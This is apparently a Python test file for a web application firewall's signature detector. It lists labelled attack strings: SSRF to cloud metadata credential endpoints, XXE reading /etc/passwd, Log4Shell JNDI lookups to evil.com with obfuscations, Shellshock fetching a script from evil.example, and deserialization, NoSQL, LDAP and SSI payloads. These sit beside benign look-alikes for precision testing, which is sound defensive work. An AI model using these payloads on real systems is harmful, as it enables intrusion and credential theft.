"""Signature layer for attack classes the WAF model has no label for (ml/waf/signatures.py).

SSRF, XML external entities, CRLF / response splitting, NoSQL operator injection, JNDI (Log4Shell) and Java/.NET/
Python deserialization, Shellshock, prototype pollution, LDAP and SSI/ESI injection. Precision first: each rule
needs the attack-specific shape, not a topic word, and ordinary look-alikes (XHTML DOCTYPE, localhost URLs, LDAP
URLs in a config, Mongo `{"$gt": 0}` queries, code that merely contains `() { }`) must pass.
"""
import os
import sys
import time

import pytest

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))
from ml.waf import signatures as sg  # noqa: E402

POSITIVES = {
    "ssrf": [
        "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://100.100.100.200/latest/meta-data/", "http://169.254.170.2/v2/credentials/abc",
        "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall", "dict://127.0.0.1:11211/stat",
        "http://2130706433/admin", "http://0x7f000001/", "http://0177.0.0.1/", "http://127.1/", "http://[::ffff:127.0.0.1]/",
        "{\"webhook\": \"http://169.254.169.254/latest/user-data\"}",
        "https://metadata.packet.net/userdata", "http://192.0.0.192/latest/user-data/", "http://2852039166/", "http://7147006462/",
        "http://0xA9.0xFE.0xA9.0xFE/", "http://0x41414141A9FEA9FE/", "http://0251.0376.0251.0376/", "http://0251.00376.000251.0000376/",
        "http://169.254.43518/", "http://169.16689662/", "http://[0:0:0:0:0:ffff:a9fe:a9fe]", "http://[::]/", "http://[fe80::1%25eth0]/",
        "ssh://0177.00.00.01", "rtmp://017700000001", "acap://\u2460\u2461\u2466.\u24ea.\u24ea.\u2460", "http://169\u3002254\u3002169\u3002254/",
        "ssrf=http:2852039166", "ssrf=http:0xA9FEA9FE", "ssrf=http:0251.0376.0251.0376", "ssrf=http:/2852039166", "ssrf=http:[::ffff:a9fe:a9fe]",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
        '<!DOCTYPE r [<!ENTITY % remote SYSTEM "http://evil.example/x.dtd">%remote;]>',
        '<!DOCTYPE data [ <!ENTITY a PUBLIC "x" "http://evil.example/e"> ]>',
        '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></root>',
    ],
    "crlf": [
        "lang=en%0d%0aSet-Cookie:%20session=attacker", "next=/home%0aLocation:%20http://evil.example",
        "q=x%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK", '{"name": "a\\r\\nSet-Cookie: x=1"}',
        "u=%0D%0ALocation: http://evil.example", "/get?parameter%0d%0a=test", "x=1&%0d%0arestofdata", "/s.jsp?a=b&%0d%0aRemote-addr:%20foo.bar.com",
        "v=%0d%0aX-Forwarded-For:%20127.0.0.1", "?%0aSet-Cookie:%20a=b=1",
    ],
    "nosqli": [
        "username[$ne]=x&password[$ne]=x", "user[$gt]=&pass[$gt]=", "login[$regex]=.*&password[$ne]=1",
        '{"username": {"$ne": null}, "password": {"$ne": null}}', '{"user": {"$gt": ""}, "password": {"$gt": ""}}',
        '{"email": {"$regex": ".*"}, "password": {"$ne": "x"}}', '{"$where": "sleep(5000) || this.password.match(/.*/)"}',
        "q[$where]=function(){return true}",
    ],
    "jndi": [
        "foo=$\\u007Bjndi:ldap://evil.com/webshell}", '{"foo": "$&lbrace;jndi:ldap://evil.com/webshell}"}', '{"foo": "&#36;{jndi:ldap://evil.com/webshell}"}',
        '{"foo": "$\\u0026lbrace;jndi:ldap://evil.com/webshell}"}', '{"foo": "%26%2336%3B%7Bjndi%3Aldap%3A%2F%2Fevil.com%2Fwebshell%7D"}',
        '{"foo": "%24&lcub;\\u006A&#110;di:ldap://evil.com/webshell}"}', '{"foo": "$\\u007Bjndi:ldap://evil.com/webshell}"}', "${jndi:ldap://evil.example/a}", "${jndi:rmi://10.0.0.1:1099/Exploit}", "${jndi:dns://evil.example}",
        "${${lower:j}ndi:${lower:l}dap://evil.example/a}", "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://evil.example/a}",
        "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap://evil.example/a}", "${${upper:j}${upper:n}di:ldap://evil.example/a}",
        "%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "x=${jndi:ldap://evil.example:1389/Basic/Command/Base64/aWQ=}",
    ],
    "deserialization": [
        "rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7",
        "viewstate=AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMA==", "data=aced0005737200",
        "payload=%AC%ED%00%05sr%00", "test=rO0ABQ", "x=\u00ac\u00ed\x00\x05sr", "!!python/object/apply:os.system ['id']", "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()\"}",
        "cos\nsystem\n(S'id'\ntR.", "org.apache.commons.collections.functors.InvokerTransformer",
        "com.sun.rowset.JdbcRowSetImpl", "ysoserial.payloads.CommonsCollections5",
    ],
    "shellshock": [
        "() { :; }; /bin/cat /etc/passwd", "() { _; } >_[$($())] { echo vulnerable; }", "() { :;}; echo; /usr/bin/id",
        "() { test; }; wget http://evil.example/x.sh",
    ],
    "prototype_pollution": [
        '{"__proto__": {"isAdmin": true}}', "a[__proto__][admin]=1", "__proto__.polluted=1", '{"constructor": {"prototype": {"x": 1}}}',
        '{"a": 1, "__proto__": {"x": 2}}', "/get?constructor.prototype.test=test", "/get?x=x&a[constructor][prototype]=image&a[constructor][prototype][onerror]=a", "constructor[prototype][test]=test", "a=1&constructor.prototype.polluted=yes",
    ],
    "ldap": [
        "*)(uid=*))(|(uid=*", "admin)(&)", "*)(objectClass=*", "(|(cn=*)(userPassword=*))", "x)(|(uid=*))",
        "foo=printer)(uid=*)", "foo=void)(objectClass=users))(&(objectClass=void)", "foo=eb9adbd87d)!(sn=*", "foo=*)!(sn=*", "foo=aaa*aaa)(cn>=bob)",
        "filter=value)(gidNumber<=100", "name=john)(sn~=smith)", "user=admin)(|", "q=test))(&(objectClass=*", "param=val)&(cn=admin)", "username=admin)(|(password=*",
    ],
    "ssi": [
        '<!--#exec cmd="ls" -->', "<!--#include virtual=\"/etc/passwd\" -->", '<!--#echo var="DOCUMENT_ROOT" -->',
        '<esi:include src="http://evil.example/x"/>', "<esi:inline name=\"/x\" fetchable=\"yes\">",
    ],
}

BENIGN = [
    "Our terms of service describe how we handle your account and data.",
    "The cloud metadata service lives at a link-local address; see the provider docs for details.",
    "http://localhost:3000/api/users", "http://127.0.0.1:8080/health", "http://[::1]:8080/", "http://0.0.0.0:8000/", "http://10.0.0.5/status",
    "ldap://ldap.example.com:389/dc=example,dc=com", "ldaps://directory.corp.example/ou=people", "https://example.com/search?q=cats&page=2",
    '<!DOCTYPE html><html><head><title>Hi</title></head><body><p>Hello</p></body></html>',
    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd"><html></html>',
    '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd" [<!ENTITY ns_svg "http://www.w3.org/2000/svg">]><svg xmlns="&ns_svg;"/>',
    '<?xml version="1.0"?><note><to>Bob</to><body>Hello</body></note>',
    "Subject: meeting\nLocation: Room 4\nContent-Type: text/plain\n\nSee you there", "Location: Paris, France", "name=Alice&location=Paris&type=text%2Fplain",
    "next=%2Faccount%3Ftab%3Dbilling%26id%3D42", "csv=a%2Cb%2Cc%0A1%2C2%2C3", "msg=line1%0Aline2%0Aline3",
    '{"filter": {"qty": {"$gt": 0}}}', '{"filter": {"deletedAt": {"$ne": null}}}', '{"age": {"$gte": 18, "$lt": 65}}',
    '{"$match": {"status": "A"}, "$group": {"_id": "$cust_id"}}', "price[min]=5&price[max]=20&sort[name]=asc",
    "username=alice&password=Passw0rd%21", '{"username":"alice","password":"hunter2"}',
    "The ${HOME} variable and ${USER:-nobody} are expanded by the shell.", "echo ${PATH} && cd ${PROJECT_DIR}", "Hello ${name}, welcome! ${count} items.",
    "template: Hello {{ name }} and ${user.name}", "jndi is a Java naming API; the word jndi alone is harmless.",
    "function f() { return 1; }", "const g = () => { return 2; };", "def h(): pass  # () { :; } is old shellshock syntax in a comment",
    "if (a() { }", "foo() { bar(); }", "int main() { return 0; }", "arr = [(1), (2)]; x = () => {}",
    "rO0 is not a magic number", "The base64 prefix rO0AB marks Java serialization in security write-ups.", "AAEAAAD is a prefix",
    "import pickle; data = pickle.loads(blob)", "yaml.safe_load(stream)", "java.lang.String and java.util.List are core classes",
    "Object.prototype.hasOwnProperty.call(o, k)", "const proto = Object.getPrototypeOf(obj);", "class A { constructor() {} }",
    "search=(cn=John*)", "filter=(objectClass=person)", "(uid=jsmith)", "Call me (maybe) at (555) 123-4567",
    "filter=(&(objectClass=person)(uid=jsmith))", "(&(objectClass=user)(sAMAccountName=bob)(memberOf=cn=admins,dc=corp))", "(|(mail=a@x.com)(mail=b@x.com))",
    "Call tel:5551234567 or tel:+4915123456789", "http://münchen.de/straße", "https://例え.jp/path", "https://xn--mnchen-3ya.de/", "ftp://files.example.com/pub",
    "id=1234567890", "ref:12345678 and order:9876543210", "http://example.com/a(b)(c=1)", "f(x)(y)", "foo(a)(b=2)",
    "constructor.prototype.method = function() {}", "AT&amp;T and &copy; 2026 &lt;b&gt;bold&lt;/b&gt;", "Tom &amp; Jerry &#38; friends", "price &#36;5 &euro;4", "MyClass.prototype.constructor = MyClass;", "this.constructor.prototype", "a=1&constructor=2&prototype=3",
    "q=100%25&r=50%25", "cache-control: no-cache", "msg=Dear+Bob%2C%0AThanks%21%0ARegards%2C%0AAlice", "note=first%0Dsecond",
    "Version 1.0.0.1 at http://10.1.2.3:8080/x and http://192.168.0.10/", "http://[2001:db8::1]:443/", "https://[::1]:8443/", "http://user:pw@10.0.0.5/",
    "<!-- a normal html comment -->", "<!-- #hashtag in a comment -->", "<esi-widget>not esi</esi-widget>",
    "see https://docs.example.com/ssi for server side includes", "SELECT * FROM users WHERE id = ?",
]


@pytest.mark.parametrize("cls,payload", [(c, p) for c, ps in POSITIVES.items() for p in ps])
def test_each_attack_shape_is_detected_under_its_class(cls, payload):
    assert cls in sg.signature_hits(payload), (cls, payload)


@pytest.mark.parametrize("text", BENIGN)
def test_ordinary_look_alikes_are_not_flagged(text):
    assert sg.signature_hits(text) == [], text


def test_percent_encoded_and_double_encoded_payloads_are_detected():
    import urllib.parse as up
    for cls in ("ssrf", "xxe", "jndi", "shellshock", "prototype_pollution"):
        p = POSITIVES[cls][0]
        assert cls in sg.signature_hits(up.quote(p, safe="")), cls
        assert cls in sg.signature_hits(up.quote(up.quote(p, safe=""), safe="")), cls


def test_hits_are_unique_sorted_names_and_several_classes_can_fire():
    got = sg.signature_hits("${jndi:ldap://169.254.169.254/a} and () { :; }; id")
    assert got == sorted(set(got)) and {"jndi", "ssrf", "shellshock"} <= set(got)


@pytest.mark.parametrize("bad", [None, 123, b"${jndi:ldap://x/a}", [], {}, ""])
def test_odd_input_never_raises(bad):
    sg.signature_hits(bad)


PATHOLOGICAL = ["${" * 30_000, "<!DOCTYPE [<!ENTITY " * 5_000, "%0d%0a" * 40_000, "{\"$ne\"" * 20_000, "() {" * 40_000, "${::-j}" * 20_000,
                "rO0AB" + "A" * 200_000, "(" * 100_000, "a" * 300_000, "[$" * 50_000, "<!--#" * 30_000, "http://" * 30_000]


@pytest.mark.parametrize("text", PATHOLOGICAL, ids=lambda s: f"{s[:10]!r}x{len(s)}")
def test_hostile_input_is_scanned_in_bounded_time(text):
    t0 = time.perf_counter()
    sg.signature_hits(text)
    assert time.perf_counter() - t0 < 1.5


def test_policy_default_block_and_env_values(monkeypatch):
    monkeypatch.delenv("WAF_SIGNATURES", raising=False)
    assert sg.signature_policy() == "block"
    for raw, want in (("advisory", "advisory"), (" OFF ", "off"), ("block", "block"), ("garbage", "block")):
        monkeypatch.setenv("WAF_SIGNATURES", raw)
        assert sg.signature_policy() == want
